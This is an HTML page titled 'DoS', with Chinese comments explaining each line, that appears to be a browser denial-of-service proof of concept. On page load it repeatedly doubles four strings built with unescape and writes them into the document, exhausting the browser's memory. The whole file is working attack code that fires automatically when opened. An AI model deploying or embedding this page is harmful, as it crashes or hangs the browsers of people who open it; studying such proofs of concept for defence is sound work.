<html>
  <title>DoS</title> <!-- 页面标题设置为 "DoS" -->
  <head>
    <script>
      // 定义 Lox 函数
      function Lox() {
        // 定义四个长字符串变量，用于存储 Unicode 编码的字符串
        var longunistring1 = unescape("%u4141%u4141"); // 生成的字符串是 "AAAA"
        var longunistring2 = unescape("%u4242%u4242"); // 生成的字符串是 "BBBB"
        var longunistring3 = unescape("%u4343%u4343"); // 生成的字符串是 "CCCC"
        var longunistring4 = unescape("%u4444%u4444"); // 生成的字符串是 "DDDD"

        // 循环 100 次
        for(i = 0; i <= 100; ++i) {
          // 通过重复字符串来逐渐增加字符串的长度
          longunistring1 += longunistring1; // 将 longunistring1 的内容重复并追加到自身
          longunistring2 += longunistring2; // 将 longunistring2 的内容重复并追加到自身
          longunistring3 += longunistring3; // 将 longunistring3 的内容重复并追加到自身
          longunistring4 += longunistring4; // 将 longunistring4 的内容重复并追加到自身

          // 将长字符串写入文档中
          document.write(longunistring1);
          document.write(longunistring2);
          document.write(longunistring3);
          document.write(longunistring4);
        }

        // 再次写入最终长度的长字符串
        document.write(longunistring1);
        document.write(longunistring2);
        document.write(longunistring3);
        document.write(longunistring4);
      }
    </script>
  </head>
  <body onLoad="Lox()"> <!-- 页面加载时调用 Lox 函数 -->
  </body>
</html>
